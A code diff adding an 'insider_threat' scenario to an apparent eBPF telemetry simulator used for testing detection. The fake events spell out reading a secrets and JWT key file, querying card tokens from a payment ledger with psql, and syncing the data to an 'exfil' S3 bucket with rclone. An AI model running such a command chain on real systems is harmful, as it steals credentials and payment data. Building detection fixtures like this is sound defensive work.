@@ -118,6 +118,34 @@ class SyntheticTelemetry(BPFTelemetry):
                     ts=base_time + 0.3, type=EventType.TCP_CONNECT,
                 ),
             ]
+        elif scenario == "insider_threat":
+            events = [
+                BPFCapture(
+                    pid=start_pid, uid=501, comm="python", args=["sync_tokens.py"],
+                    binary="/usr/bin/python3", cwd="/app/inventory", ts=base_time,
+                    type=EventType.EXECVE, src="svc:inventory",
+                ),
+                BPFCapture(
+                    pid=start_pid, uid=501, comm="cat", args=["/secrets/dev-token-001"],
+                    binary="/bin/cat", cwd="/app/inventory", path="/secrets/secrets-store/jwt.key",
+                    ts=base_time + 0.1, type=EventType.FILE_ACCESS, src="svc:inventory",
+                ),
+                BPFCapture(
+                    pid=start_pid + 1, uid=501, comm="curl", args=["https://payment-gateway.internal/auth"],
+                    binary="/usr/bin/curl", cwd="/app/inventory", dst="svc:payment-gateway", dst_port=8443,
+                    ts=base_time + 0.2, type=EventType.TCP_CONNECT, src="svc:inventory",
+                ),
+                BPFCapture(
+                    pid=start_pid + 2, uid=501, comm="psql", args=["-d", "upi-ledger", "-c", "SELECT card_token FROM upi_tokens"],
+                    binary="/usr/bin/psql", cwd="/app/inventory", dst="db:upi-ledger", dst_port=5432,
+                    ts=base_time + 0.3, type=EventType.TCP_CONNECT, src="svc:inventory",
+                ),
+                BPFCapture(
+                    pid=start_pid + 3, uid=501, comm="rclone", args=["sync", "/tmp/upi", "s3://backup-bucket/exfil"],
+                    binary="/usr/bin/rclone", cwd="/app/inventory", path="/backup-bucket/exfil_tokens.bin",
+                    ts=base_time + 0.4, type=EventType.FILE_ACCESS, src="svc:inventory",
+                ),
+            ]
         else:
             # Default: supply_chain_npm
             events = [
